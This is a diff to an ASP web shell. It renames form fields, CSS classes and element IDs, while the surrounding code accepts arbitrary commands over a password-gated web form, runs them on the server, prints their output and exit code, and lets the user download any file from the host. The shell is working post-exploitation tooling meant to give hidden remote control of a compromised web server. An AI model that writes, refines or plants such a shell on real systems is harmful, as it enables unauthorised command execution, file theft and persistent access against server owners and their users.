@@ -10,7 +10,7 @@ If stealthPassword <> "" AND Request.QueryString("pw") <> stealthPassword Then
 End If
 
 Dim downloadFile, downloadMsg, fs, objStream
-downloadFile = Request.Form("download-file")
+downloadFile = Request.Form("downloadFile")
 If trim(downloadFile) <> "" Then
     Set fs = Server.CreateObject("Scripting.FileSystemObject")
     Set objStream = Server.CreateObject("ADODB.Stream")
@@ -59,23 +59,23 @@ end sub
             input[type=text] {
                 font-family: monospace;
             }
-            .cmd-box {
+            .cmdBox {
                 width: 80%;
             }
-            .info-line {
+            .infoText {
                 margin: 3px auto;
             }
-            .feature-box {
+            .featureBox {
                 margin: 1rem auto;
             }
         </style>
     </head>
     <body>
-        <form id="form-cmd" method="POST" action="">
-            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmd-box" />
-            <input type="submit" name="submit-cmd" value="Run" />
+        <form id="cmdForm" method="POST" action="">
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
+            <input type="submit" name="cmdSubmit" value="Run" />
         </form>
-        <div class="info-line">
+        <div class="infoText">
 <%
 If command <> "" Then
     Response.Write("Output of command: <code>" & Server.HTMLEncode(command) & "</code>")
@@ -84,28 +84,28 @@ Else
 End If
 %>
         </div>
-        <textarea readonly="readonly" rows="25" class="cmd-box">
+        <textarea readonly="readonly" rows="25" class="cmdBox">
 <%
 If command <> "" Then
     call execute(command)
 End If
 %>
         </textarea>
-        <div class="info-line">
+        <div class="infoText">
 <%
 If exitCode <> "" Then
     Response.Write("Exit code: <code>" & Server.HTMLEncode(exitCode) & "</code>")
 End If
 %>
         </div>
-        <div class="feature-box">
+        <div class="featureBox">
             <b>File Download</b>
             <div>
 <%= downloadMsg %>
             </div>
             <form method="POST" action="">
-                <input type="text" name="download-file" placeholder="File to download" />
-                <input type="submit" name="submit-download" value="Download" />
+                <input type="text" name="downloadFile" placeholder="File to download" />
+                <input type="submit" name="downloadSubmit" value="Download" />
             </form>
         </div>
         <script>
@@ -139,7 +139,7 @@ End If
                 shellHistory = new Array();
             }
             var historyPos = shellHistory.length;
-            document.getElementById("form-cmd").addEventListener("submit", saveHistory);
+            document.getElementById("cmdForm").addEventListener("submit", saveHistory);
             document.getElementById("cmd").addEventListener("keydown", cycleHistory);
         </script>
     </body>
